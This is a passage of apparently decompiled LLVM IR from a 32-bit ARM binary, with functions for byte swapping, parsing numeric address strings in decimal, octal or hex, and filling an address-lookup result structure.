  %v2_f5fc = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v2_f5fc
}

define i32 @function_f604(i32 %arg1) local_unnamed_addr {
dec_label_pc_f604:
  %tmp = mul i32 %arg1, 256
  %v1_f60c = and i32 %tmp, 65280
  %tmp1 = udiv i32 %arg1, 256
  %v4_f610 = urem i32 %tmp1, 256
  %v5_f610 = or i32 %v4_f610, %v1_f60c
  ret i32 %v5_f610

; uselistorder directives
  uselistorder i32 65280, { 3, 4, 2, 0, 1 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_f618(i32 %arg1) local_unnamed_addr {
dec_label_pc_f618:
  %v0_f624.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_f624

dec_label_pc_f624:                                ; preds = %dec_label_pc_f710, %dec_label_pc_f618
  %v1_f6f4 = phi i32 [ %v2_f6fc, %dec_label_pc_f710 ], [ 0, %dec_label_pc_f618 ]
  %v0_f704 = phi i32 [ %v1_f704, %dec_label_pc_f710 ], [ 0, %dec_label_pc_f618 ]
  %v0_f638 = phi i32 [ %v1_f710, %dec_label_pc_f710 ], [ %v0_f624.pre, %dec_label_pc_f618 ]
  %v1_f624 = inttoptr i32 %v0_f638 to i8*
  %v2_f624 = load i8, i8* %v1_f624, align 1
  %v7_f628 = icmp eq i8 %v2_f624, 48
  br i1 %v7_f628, label %dec_label_pc_f638, label %.thread

.thread:                                          ; preds = %dec_label_pc_f624
  br label %.thread9

dec_label_pc_f638:                                ; preds = %dec_label_pc_f624
  %v1_f638 = add i32 %v0_f638, 1
  %v2_f638 = inttoptr i32 %v1_f638 to i8*
  %v3_f638 = load i8, i8* %v2_f638, align 1
  %v7_f63c = icmp eq i8 %v3_f638, 88
  br i1 %v7_f63c, label %bb58, label %bb

bb:                                               ; preds = %dec_label_pc_f638
  %v8_f640 = icmp eq i8 %v3_f638, 120
  br i1 %v8_f640, label %bb58, label %.thread3

.thread3:                                         ; preds = %bb
  br label %.thread9

bb58:                                             ; preds = %dec_label_pc_f638, %bb
  %v2_f64c = add i32 %v0_f638, 2
  br label %.thread9

.thread9:                                         ; preds = %.thread3, %.thread, %bb58
  %v0_f6d823 = phi i32 [ %v1_f638, %.thread3 ], [ %v0_f638, %.thread ], [ %v2_f64c, %bb58 ]
  %v0_f6e842 = phi i32 [ 1, %.thread3 ], [ 0, %.thread ], [ 0, %bb58 ]
  %v0_f69c37 = phi i32 [ 8, %.thread3 ], [ 10, %.thread ], [ 16, %bb58 ]
  br label %dec_label_pc_f6d8

dec_label_pc_f660:                                ; preds = %dec_label_pc_f6d8
  %v2_f6e0 = mul nuw nsw i32 %v3_f6d8, 2
  %v2_f664 = load i32, i32* @global_var_18428, align 4
  %v2_f668 = add i32 %v2_f664, %v2_f6e0
  %v3_f66c = inttoptr i32 %v2_f668 to i8*
  %v4_f66c = load i8, i8* %v3_f66c, align 1
  %v6_f66c = zext i8 %v4_f66c to i32
  %v1_f678 = and i32 %v6_f66c, 8
  %v2_f678 = icmp eq i32 %v1_f678, 0
  br i1 %v2_f678, label %dec_label_pc_f6a8, label %dec_label_pc_f680

dec_label_pc_f680:                                ; preds = %dec_label_pc_f660
  %tmp = icmp ult i8 %v2_f6d8, 56
  br i1 %tmp, label %.thread11, label %bb61

.thread11:                                        ; preds = %dec_label_pc_f680
  br label %dec_label_pc_f69c

bb61:                                             ; preds = %dec_label_pc_f680
  %v7_f680 = icmp eq i32 %v0_f6a8, 8
  %v2_f694 = icmp eq i1 %v7_f680, false
  br i1 %v2_f694, label %dec_label_pc_f69c, label %dec_label_pc_f720

dec_label_pc_f69c:                                ; preds = %.thread11, %bb61
  %v3_f69c = mul i32 %v1_f6fc, %v0_f69c37
  %v4_f69c = add i32 %v3_f6d8, %v3_f69c
  %v1_f6a0 = add i32 %v4_f69c, -48
  br label %dec_label_pc_f6c8

dec_label_pc_f6a8:                                ; preds = %dec_label_pc_f660
  %v7_f6a8 = icmp eq i32 %v0_f6a8, 16
  br i1 %v7_f6a8, label %dec_label_pc_f6b0, label %dec_label_pc_f6e8

dec_label_pc_f6b0:                                ; preds = %dec_label_pc_f6a8
  %v1_f6b0 = and i32 %v6_f66c, 16
  %v2_f6b0 = icmp eq i32 %v1_f6b0, 0
  br i1 %v2_f6b0, label %dec_label_pc_f6e8, label %dec_label_pc_f6b8

dec_label_pc_f6b8:                                ; preds = %dec_label_pc_f6b0
  %v1_f6b8 = and i32 %v6_f66c, 2
  %tmp80 = mul nuw nsw i32 %v1_f6b8, 16
  %tmp81 = xor i32 %tmp80, 32
  %tmp82 = add nsw i32 %tmp81, -87
  %v4_f6c4 = mul i32 %v1_f6fc, 16
  %v5_f6c4 = add i32 %tmp82, %v4_f6c4
  br label %dec_label_pc_f6c8

dec_label_pc_f6c8:                                ; preds = %dec_label_pc_f69c, %dec_label_pc_f6b8
  %v0_f6a831 = phi i32 [ %v0_f69c37, %dec_label_pc_f69c ], [ 16, %dec_label_pc_f6b8 ]
  %storemerge = phi i32 [ %v1_f6a0, %dec_label_pc_f69c ], [ %v5_f6c4, %dec_label_pc_f6b8 ]
  %v1_f6cc = add i32 %v0_f710, 1
  %tmp83 = icmp ugt i32 %storemerge, 255
  br i1 %tmp83, label %dec_label_pc_f720, label %dec_label_pc_f6d8

dec_label_pc_f6d8:                                ; preds = %dec_label_pc_f6c8, %.thread9
  %v0_f6e8 = phi i32 [ 1, %dec_label_pc_f6c8 ], [ %v0_f6e842, %.thread9 ]
  %v1_f6fc = phi i32 [ %storemerge, %dec_label_pc_f6c8 ], [ 0, %.thread9 ]
  %v0_f6a8 = phi i32 [ %v0_f6a831, %dec_label_pc_f6c8 ], [ %v0_f69c37, %.thread9 ]
  %v0_f710 = phi i32 [ %v1_f6cc, %dec_label_pc_f6c8 ], [ %v0_f6d823, %.thread9 ]
  %v1_f6d8 = inttoptr i32 %v0_f710 to i8*
  %v2_f6d8 = load i8, i8* %v1_f6d8, align 1
  %v3_f6d8 = zext i8 %v2_f6d8 to i32
  %v2_f6dc = icmp eq i8 %v2_f6d8, 0
  br i1 %v2_f6dc, label %dec_label_pc_f6e8, label %dec_label_pc_f660

dec_label_pc_f6e8:                                ; preds = %dec_label_pc_f6a8, %dec_label_pc_f6d8, %dec_label_pc_f6b0
  %v2_f6d8.lcssa = phi i8 [ %v2_f6d8, %dec_label_pc_f6a8 ], [ 0, %dec_label_pc_f6d8 ], [ %v2_f6d8, %dec_label_pc_f6b0 ]
  %v2_f6dc.lcssa = phi i1 [ false, %dec_label_pc_f6a8 ], [ true, %dec_label_pc_f6d8 ], [ false, %dec_label_pc_f6b0 ]
  %v2_f6e8 = icmp eq i32 %v0_f6e8, 0
  br i1 %v2_f6e8, label %dec_label_pc_f720, label %dec_label_pc_f6f0

dec_label_pc_f6f0:                                ; preds = %dec_label_pc_f6e8
  %v2_f6f0 = icmp eq i32 %v0_f704, 0
  br i1 %v2_f6f0, label %bb65, label %bb64

bb64:                                             ; preds = %dec_label_pc_f6f0
  %v4_f6f4 = mul i32 %v1_f6f4, 256
  br label %bb65

bb65:                                             ; preds = %dec_label_pc_f6f0, %bb64
  %v0_f6fc = phi i32 [ %v1_f6f4, %dec_label_pc_f6f0 ], [ %v4_f6f4, %bb64 ]
  %v7_f6f8 = icmp eq i8 %v2_f6d8.lcssa, 46
  %v2_f6fc = or i32 %v0_f6fc, %v1_f6fc
  br i1 %v7_f6f8, label %dec_label_pc_f704, label %dec_label_pc_f718

dec_label_pc_f704:                                ; preds = %bb65
  %v1_f704 = add i32 %v0_f704, 1
  %v7_f708 = icmp eq i32 %v1_f704, 4
  br i1 %v7_f708, label %dec_label_pc_f720, label %dec_label_pc_f710

dec_label_pc_f710:                                ; preds = %dec_label_pc_f704
  %v1_f710 = add i32 %v0_f710, 1
  br label %dec_label_pc_f624

dec_label_pc_f718:                                ; preds = %bb65
  br i1 %v2_f6dc.lcssa, label %dec_label_pc_f724, label %dec_label_pc_f720

dec_label_pc_f720:                                ; preds = %dec_label_pc_f704, %dec_label_pc_f6e8, %bb61, %dec_label_pc_f6c8, %dec_label_pc_f718
  br label %dec_label_pc_f724

dec_label_pc_f724:                                ; preds = %dec_label_pc_f718, %dec_label_pc_f720
  %v0_f724 = phi i32 [ %v2_f6fc, %dec_label_pc_f718 ], [ -1, %dec_label_pc_f720 ]
  ret i32 %v0_f724

; uselistorder directives
  uselistorder i32 %v1_f704, { 1, 0 }
  uselistorder i8 %v2_f6d8, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v0_f710, { 0, 2, 1 }
  uselistorder i32 %v0_f6a8, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v0_f69c37, { 1, 2, 0 }
  uselistorder i32 %v1_f6f4, { 1, 0 }
  uselistorder label %dec_label_pc_f724, { 1, 0 }
  uselistorder label %dec_label_pc_f720, { 4, 0, 1, 3, 2 }
  uselistorder label %bb65, { 1, 0 }
  uselistorder label %dec_label_pc_f6e8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_f6c8, { 1, 0 }
  uselistorder label %dec_label_pc_f69c, { 1, 0 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %bb58, { 1, 0 }
}

define i32 @function_f730(i32 %arg1) local_unnamed_addr {
dec_label_pc_f730:
  %stack_var_-8 = alloca i32, align 4
  %v2_f734 = ptrtoint i32* %stack_var_-8 to i32
  %v0_f73c = load i32, i32* @r0, align 4
  %v2_f73c = inttoptr i32 %v0_f73c to i8*
  %v3_f73c = call i32 @function_12a64(i8* %v2_f73c, i32 %v2_f734)
  %v2_f740 = icmp eq i32 %v3_f73c, 0
  br i1 %v2_f740, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_f730
  %v3_f748 = load i32, i32* %stack_var_-8, align 4
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_f730, %bb
  %v5_f750 = phi i32 [ -1, %dec_label_pc_f730 ], [ %v3_f748, %bb ]
  ret i32 %v5_f750

; uselistorder directives
  uselistorder label %bb4, { 1, 0 }
}

define i32 @function_f754(i32 %arg1) local_unnamed_addr {
dec_label_pc_f754:
  %stack_var_-12 = alloca i32, align 4
  %v3_f754 = load i32, i32* @r4, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_f760 = call i32 @function_11514()
  %v2_f764 = ptrtoint i32* %stack_var_-12 to i32
  %v0_f770 = load i32, i32* @r4, align 4
  %v7_f780 = call i32 @function_f798(i32 %v0_f770, i32* nonnull @global_var_1aa7c.426, i32 ptrtoint (i32* @global_var_1a8b0.428 to i32), i32 460, i32 %v2_f764, i32 %v0_f760)
  %v3_f784 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_f754, i32* @r4, align 4
  ret i32 %v3_f784
}

define i32 @function_f798(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_f798:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v6_f798 = load i32, i32* @r5, align 4
  %v9_f798 = load i32, i32* @r6, align 4
  %v12_f798 = load i32, i32* @r7, align 4
  %v15_f798 = load i32, i32* @r8, align 4
  %v18_f798 = load i32, i32* @sb, align 4
  %v21_f798 = load i32, i32* @sl, align 4
  %v24_f798 = load i32, i32* @fp, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg5, i32* %r2.global-to-local, align 4
  %v0_f7a8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_f7a8, i32* @fp, align 4
  %v2_f7a8 = icmp eq i32 %v0_f7a8, 0
  store i32 0, i32* @r6, align 4
  store i32 %tmp, i32* @sl, align 4
  store i32 %arg4, i32* @r4, align 4
  %v2_f7b8 = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v2_f7b8, align 4
  br i1 %v2_f7a8, label %bb, label %dec_label_pc_f7c4

bb:                                               ; preds = %dec_label_pc_f798
  %v1_f7bc = load i32, i32* %r0.global-to-local, align 4
  %v2_f7bc = add i32 %v1_f7bc, 22
  store i32 %v2_f7bc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fae8

dec_label_pc_f7c4:                                ; preds = %dec_label_pc_f798
  %v0_f7c4 = call i32 @function_cec4()
  store i32 %v0_f7c4, i32* %r0.global-to-local, align 4
  %v3_f7c8 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_f7c8, i32* %ip.global-to-local, align 4
  %v1_f7cc = inttoptr i32 %v0_f7c4 to i32*
  %v2_f7cc = load i32, i32* %v1_f7cc, align 4
  store i32 %v2_f7cc, i32* @r8, align 4
  %v0_f7d0 = load i32, i32* @r6, align 4
  store i32 %v0_f7d0, i32* %v1_f7cc, align 4
  %v0_f7d4 = load i32, i32* %ip.global-to-local, align 4
  store i32 %arg6, i32* %ip.global-to-local, align 4
  store i32 %v0_f7c4, i32* @r5, align 4
  %v0_f7e4 = load i32, i32* @fp, align 4
  store i32 %v0_f7e4, i32* %r0.global-to-local, align 4
  %v0_f7e8 = load i32, i32* @sl, align 4
  store i32 %v0_f7e8, i32* %r2.global-to-local, align 4
  %v0_f7ec = load i32, i32* @r7, align 4
  store i32 %v0_f7ec, i32* %r3.global-to-local, align 4
  %v0_f7f0 = load i32, i32* @r4, align 4
  %v7_f7f8 = call i32 @function_13630(i32 %v0_f7e4, i32 2, i32 %v0_f7e8, i32 %v0_f7ec, i32 %v0_f7f0, i32 %v0_f7d4, i32 %arg6)
  store i32 %v7_f7f8, i32* %r0.global-to-local, align 4
  %v2_f7fc = icmp eq i32 %v7_f7f8, 0
  br i1 %v2_f7fc, label %dec_label_pc_fae8, label %dec_label_pc_f804

dec_label_pc_f804:                                ; preds = %dec_label_pc_f7c4
  store i32 %arg6, i32* %r2.global-to-local, align 4
  %v1_f808 = inttoptr i32 %arg6 to i32*
  %v2_f808 = load i32, i32* %v1_f808, align 4
  store i32 %v2_f808, i32* %r3.global-to-local, align 4
  %v7_f80c = icmp eq i32 %v2_f808, 1
  br i1 %v7_f80c, label %dec_label_pc_f830, label %dec_label_pc_f814

dec_label_pc_f814:                                ; preds = %dec_label_pc_f804
  %v7_f814 = icmp eq i32 %v2_f808, 4
  br i1 %v7_f814, label %dec_label_pc_f830, label %dec_label_pc_f81c

dec_label_pc_f81c:                                ; preds = %dec_label_pc_f814
  %v3_f81c = icmp eq i32 %v2_f808, -1
  br i1 %v3_f81c, label %dec_label_pc_f824, label %dec_label_pc_fae8

dec_label_pc_f824:                                ; preds = %dec_label_pc_f81c
  %v0_f824 = load i32, i32* @r5, align 4
  %v1_f824 = inttoptr i32 %v0_f824 to i32*
  %v2_f824 = load i32, i32* %v1_f824, align 4
  store i32 %v2_f824, i32* %r3.global-to-local, align 4
  %v7_f828 = icmp eq i32 %v2_f824, 2
  br i1 %v7_f828, label %dec_label_pc_f830, label %dec_label_pc_fae8

dec_label_pc_f830:                                ; preds = %dec_label_pc_f824, %dec_label_pc_f814, %dec_label_pc_f804
  %v0_f830 = load i32, i32* @r7, align 4
  %v1_f830 = sub i32 0, %v0_f830
  %v1_f834 = urem i32 %v1_f830, 4
  store i32 %v1_f834, i32* %r3.global-to-local, align 4
  %v2_f834 = icmp eq i32 %v1_f834, 0
  %v0_f838 = load i32, i32* @r8, align 4
  %v1_f838 = load i32, i32* @r5, align 4
  %v2_f838 = inttoptr i32 %v1_f838 to i32*
  store i32 %v0_f838, i32* %v2_f838, align 4
  %v0_f858.pre = load i32, i32* @r4, align 4
  br i1 %v2_f834, label %dec_label_pc_f850, label %dec_label_pc_f840

dec_label_pc_f840:                                ; preds = %dec_label_pc_f830
  %v1_f840 = load i32, i32* %r3.global-to-local, align 4
  %v2_f840 = sub i32 %v0_f858.pre, %v1_f840
  %v3_f840 = icmp ult i32 %v0_f858.pre, %v1_f840
  br i1 %v3_f840, label %dec_label_pc_fae4, label %dec_label_pc_f848

dec_label_pc_f848:                                ; preds = %dec_label_pc_f840
  store i32 %v2_f840, i32* @r4, align 4
  %v0_f84c = load i32, i32* @r7, align 4
  %v2_f84c = add i32 %v0_f84c, %v1_f840
  store i32 %v2_f84c, i32* @r7, align 4
  br label %dec_label_pc_f850

dec_label_pc_f850:                                ; preds = %dec_label_pc_f830, %dec_label_pc_f848
  %v0_f858 = phi i32 [ %v2_f840, %dec_label_pc_f848 ], [ %v0_f858.pre, %dec_label_pc_f830 ]
  store i32 %arg6, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  store i32 -1, i32* %v1_f808, align 4
  %tmp31 = icmp ult i32 %v0_f858, 4
  br i1 %tmp31, label %dec_label_pc_fae4, label %dec_label_pc_f864

dec_label_pc_f864:                                ; preds = %dec_label_pc_f850
  %v0_f864 = load i32, i32* @r4, align 4
  %v1_f864 = add i32 %v0_f864, -4
  store i32 %v1_f864, i32* %r3.global-to-local, align 4
  %tmp32 = icmp ult i32 %v1_f864, 8
  br i1 %tmp32, label %dec_label_pc_fae4, label %dec_label_pc_f870

dec_label_pc_f870:                                ; preds = %dec_label_pc_f864
  %v1_f870 = add i32 %v0_f864, -12
  store i32 %v1_f870, i32* %r3.global-to-local, align 4
  %v0_f874 = load i32, i32* @r7, align 4
  %v1_f874 = add i32 %v0_f874, 4
  store i32 %v1_f874, i32* @sb, align 4
  store i32 0, i32* @r5, align 4
  %v3_f880 = inttoptr i32 %v1_f874 to i32*
  store i32 %v0_f874, i32* %v3_f880, align 4
  %v0_f884 = load i32, i32* @r5, align 4
  %v1_f884 = load i32, i32* @sb, align 4
  %v2_f884 = add i32 %v1_f884, 4
  %v3_f884 = inttoptr i32 %v2_f884 to i32*
  store i32 %v0_f884, i32* %v3_f884, align 4
  %tmp33 = icmp ult i32 %v1_f870, 32
  br i1 %tmp33, label %dec_label_pc_fae4, label %dec_label_pc_f88c

dec_label_pc_f88c:                                ; preds = %dec_label_pc_f870
  %v0_f88c = load i32, i32* @r4, align 4
  %v1_f88c = add i32 %v0_f88c, -44
  store i32 %v1_f88c, i32* @r8, align 4
  %tmp34 = icmp ult i32 %v1_f88c, 256
  br i1 %tmp34, label %dec_label_pc_fae4, label %dec_label_pc_f898

dec_label_pc_f898:                                ; preds = %dec_label_pc_f88c
  %v0_f898 = load i32, i32* @r7, align 4
  %v1_f898 = add i32 %v0_f898, 44
  store i32 %v1_f898, i32* @r6, align 4
  %v1_f89c = add i32 %v0_f898, 12
  store i32 %v1_f89c, i32* %r3.global-to-local, align 4
  %v0_f8a0 = load i32, i32* @fp, align 4
  store i32 %v0_f8a0, i32* @r1, align 4
  store i32 %v1_f88c, i32* %r2.global-to-local, align 4
  store i32 %v1_f898, i32* %r0.global-to-local, align 4
  %v3_f8b0 = call i32 @function_f1d0(i32 %v1_f898, i32 %v0_f8a0, i32 %v1_f88c)
  store i32 %v1_f89c, i32* %ip.global-to-local, align 4
  %v0_f8b8 = load i32, i32* @r6, align 4
  %v1_f8b8 = load i32, i32* @r7, align 4
  %v2_f8b8 = add i32 %v1_f8b8, 12
  %v3_f8b8 = inttoptr i32 %v2_f8b8 to i32*
  store i32 %v0_f8b8, i32* %v3_f8b8, align 4
  %v0_f8bc = load i32, i32* @fp, align 4
  store i32 %v0_f8bc, i32* %r0.global-to-local, align 4
  %v0_f8c0 = load i32, i32* @r5, align 4
  %v1_f8c0 = load i32, i32* %ip.global-to-local, align 4
  %v2_f8c0 = add i32 %v1_f8c0, 4
  %v3_f8c0 = inttoptr i32 %v2_f8c0 to i32*
  store i32 %v0_f8c0, i32* %v3_f8c0, align 4
  %v0_f8c4 = load i32, i32* @r7, align 4
  %v2_f8c8 = inttoptr i32 %v0_f8bc to i8*
  %v3_f8c8 = call i32 @function_12a64(i8* %v2_f8c8, i32 %v0_f8c4)
  store i32 %v3_f8c8, i32* %r0.global-to-local, align 4
  %v2_f8cc = icmp eq i32 %v3_f8c8, 0
  br i1 %v2_f8cc, label %dec_label_pc_f910, label %dec_label_pc_f8d8

dec_label_pc_f8d8:                                ; preds = %dec_label_pc_f898
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_f8dc = load i32, i32* @sl, align 4
  %v2_f8dc = add i32 %v1_f8dc, 8
  %v3_f8dc = inttoptr i32 %v2_f8dc to i32*
  store i32 2, i32* %v3_f8dc, align 4
  %v0_f8e0 = load i32, i32* %r3.global-to-local, align 4
  %v2_f8e0 = mul i32 %v0_f8e0, 2
  %v1_f8e4 = load i32, i32* @sl, align 4
  %v2_f8e4 = add i32 %v1_f8e4, 12
  %v3_f8e4 = inttoptr i32 %v2_f8e4 to i32*
  store i32 %v2_f8e0, i32* %v3_f8e4, align 4
  %v3_f8e8 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_f8e8, i32* %r2.global-to-local, align 4
  store i32 %v1_f89c, i32* %r3.global-to-local, align 4
  store i32 %arg6, i32* %ip.global-to-local, align 4
  %v0_f8f4 = load i32, i32* @r5, align 4
  store i32 %v0_f8f4, i32* %r0.global-to-local, align 4
  %v0_f8f8 = load i32, i32* @sl, align 4
  %v2_f8f8 = inttoptr i32 %v3_f8e8 to i32*
  store i32 %v0_f8f8, i32* %v2_f8f8, align 4
  %v0_f8fc = load i32, i32* @r6, align 4
  %v1_f8fc = load i32, i32* @sl, align 4
  %v2_f8fc = inttoptr i32 %v1_f8fc to i32*
  store i32 %v0_f8fc, i32* %v2_f8fc, align 4
  %v0_f900 = load i32, i32* @sb, align 4
  %v1_f900 = load i32, i32* @sl, align 4
  %v2_f900 = add i32 %v1_f900, 16
  %v3_f900 = inttoptr i32 %v2_f900 to i32*
  store i32 %v0_f900, i32* %v3_f900, align 4
  %v0_f904 = load i32, i32* %r3.global-to-local, align 4
  %v1_f904 = load i32, i32* @sl, align 4
  %v2_f904 = add i32 %v1_f904, 4
  %v3_f904 = inttoptr i32 %v2_f904 to i32*
  store i32 %v0_f904, i32* %v3_f904, align 4
  %v0_f908 = load i32, i32* @r5, align 4
  %v1_f908 = load i32, i32* %ip.global-to-local, align 4
  %v2_f908 = inttoptr i32 %v1_f908 to i32*
  store i32 %v0_f908, i32* %v2_f908, align 4
  br label %dec_label_pc_fae8

dec_label_pc_f910:                                ; preds = %dec_label_pc_f898
  %v2_f910 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_f910, i32* @r5, align 4
  %v1_f914 = call i32 @function_1335c(i32 0)
  store i32 ptrtoint (i32* @global_var_18438.430 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_f910, i32* @r0, align 4
  store i32 68948, i32* %r3.global-to-local, align 4
  %v1_f92c = call i32 @function_10d54()
  store i32 ptrtoint (i8* @global_var_10d4c.283 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18438.430 to i32), i32* %r0.global-to-local, align 4
  %v1_f93c = call i32 @function_10d4c()
  store i32 %v2_f910, i32* @r0, align 4
  %v2_f948 = load i32, i32* @global_var_1ad44.435, align 4
  store i32 %v2_f948, i32* @r4, align 4
  store i32 68948, i32* %r3.global-to-local, align 4
  %v1_f958 = call i32 @function_10d54()
  %v2_f964 = ptrtoint i32* %stack_var_-40 to i32
  store i32 ptrtoint (i32* @global_var_1ad38.438 to i32), i32* %r3.global-to-local, align 4
  %v0_f970 = load i32, i32* @fp, align 4
  store i32 %v0_f970, i32* %r0.global-to-local, align 4
  %v2_f974 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_f974, i32* %ip.global-to-local, align 4
  %v0_f978 = load i32, i32* @r4, align 4
  store i32 %v0_f978, i32* %r2.global-to-local, align 4
  %v6_f98c = inttoptr i32 %v0_f970 to i8*
  %v7_f98c = call i32 @function_12b50(i8* %v6_f98c, i32 1, i32 %v0_f978, i32 ptrtoint (i32* @global_var_1ad38.438 to i32), i32 %v2_f964, i32 %v2_f974)
  store i32 %v7_f98c, i32* %r0.global-to-local, align 4
  %v1_f990 = icmp slt i32 %v7_f98c, 0
  br i1 %v1_f990, label %.dec_label_pc_fabc_crit_edge, label %dec_label_pc_f9a0

.dec_label_pc_fabc_crit_edge:                     ; preds = %dec_label_pc_f910
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_fabc

dec_label_pc_f9a0:                                ; preds = %dec_label_pc_f910
  store i32 256, i32* %r3.global-to-local, align 4
  %v1_f9b4 = load i32, i32* @r8, align 4
  %tmp35 = icmp ugt i32 %v1_f9b4, 255
  br i1 %tmp35, label %dec_label_pc_fa50, label %dec_label_pc_f9bc

dec_label_pc_f9bc:                                ; preds = %dec_label_pc_f9a0
  %v3_f9bc = load i32, i32* %stack_var_-96, align 4
  store i32 %v3_f9bc, i32* @r0, align 4
  %v0_f9c0 = call i32 @function_fdcc()
  %v3_f9c4 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_f9c4, i32* @r0, align 4
  %v0_f9c8 = call i32 @function_fdcc()
  store i32 %arg6, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  store i32 34, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %v1_f808, align 4
  br label %dec_label_pc_fae8

dec_label_pc_fa50:                                ; preds = %dec_label_pc_f9a0
  %v3_fa54.pre = load i32, i32* %stack_var_-96, align 4
  %v0_fa58.pre = load i32, i32* @r6, align 4
  store i32 %v1_f9b4, i32* %r2.global-to-local, align 4
  store i32 %v3_fa54.pre, i32* @r1, align 4
  store i32 %v0_fa58.pre, i32* %r0.global-to-local, align 4
  %v3_fa5c = call i32 @function_f1d0(i32 %v0_fa58.pre, i32 %v3_fa54.pre, i32 %v1_f9b4)
  %v3_fa60 = load i32, i32* %stack_var_-96, align 4
  store i32 %v3_fa60, i32* @r0, align 4
  %v0_fa64 = call i32 @function_fdcc()
  store i32 %v0_fa64, i32* %r0.global-to-local, align 4
  store i32 %tmp7, i32* %r3.global-to-local, align 4
  %v7_fa6c = icmp eq i32 %tmp7, 1
  br i1 %v7_fa6c, label %dec_label_pc_fa74, label %dec_label_pc_fac8

dec_label_pc_fa74:                                ; preds = %dec_label_pc_fa50
  store i32 4, i32* @r2, align 4
  %v0_fa7c = load i32, i32* @r7, align 4
  store i32 %v0_fa7c, i32* @r0, align 4
  %v0_fa80 = call i32 @function_ef60()
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 %v1_f89c, i32* %r2.global-to-local, align 4
  %v1_fa8c = load i32, i32* @sl, align 4
  %v2_fa8c = add i32 %v1_fa8c, 8
  %v3_fa8c = inttoptr i32 %v2_fa8c to i32*
  store i32 2, i32* %v3_fa8c, align 4
  %v0_fa90 = load i32, i32* %r3.global-to-local, align 4
  %v2_fa90 = mul i32 %v0_fa90, 2
  store i32 %v2_fa90, i32* %r3.global-to-local, align 4
  %v1_fa94 = load i32, i32* @sl, align 4
  %v2_fa94 = add i32 %v1_fa94, 12
  %v3_fa94 = inttoptr i32 %v2_fa94 to i32*
  store i32 %v2_fa90, i32* %v3_fa94, align 4
  %v3_fa98 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_fa98, i32* @r0, align 4
  %v0_fa9c = load i32, i32* @r6, align 4
  %v1_fa9c = load i32, i32* @sl, align 4
  %v2_fa9c = inttoptr i32 %v1_fa9c to i32*
  store i32 %v0_fa9c, i32* %v2_fa9c, align 4
  %v0_faa0 = load i32, i32* @sb, align 4
  %v1_faa0 = load i32, i32* @sl, align 4
  %v2_faa0 = add i32 %v1_faa0, 16
  %v3_faa0 = inttoptr i32 %v2_faa0 to i32*
  store i32 %v0_faa0, i32* %v3_faa0, align 4
  %v0_faa4 = load i32, i32* %r2.global-to-local, align 4
  %v1_faa4 = load i32, i32* @sl, align 4
  %v2_faa4 = add i32 %v1_faa4, 4
  %v3_faa4 = inttoptr i32 %v2_faa4 to i32*
  store i32 %v0_faa4, i32* %v3_faa4, align 4
  %v0_faa8 = call i32 @function_fdcc()
  %v3_faac = load i32, i32* %stack_var_0, align 4
  store i32 %v3_faac, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_fab4 = load i32, i32* @sl, align 4
  %v2_fab4 = inttoptr i32 %v3_faac to i32*
  store i32 %v0_fab4, i32* %v2_fab4, align 4
  %v0_fab8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_fab8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fabc

dec_label_pc_fabc:                                ; preds = %.dec_label_pc_fabc_crit_edge, %dec_label_pc_fa74
  %v0_fac0 = phi i32 [ 1, %.dec_label_pc_fabc_crit_edge ], [ %v0_fab8, %dec_label_pc_fa74 ]
  store i32 %arg6, i32* %r2.global-to-local, align 4
  store i32 %v0_fac0, i32* %v1_f808, align 4
  br label %dec_label_pc_fae8

dec_label_pc_fac8:                                ; preds = %dec_label_pc_fa50
  %v3_fac8 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_fac8, i32* @r0, align 4
  %v0_facc = call i32 @function_fdcc()
  store i32 %arg6, i32* %ip.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %v1_f808, align 4
  br label %dec_label_pc_fae8

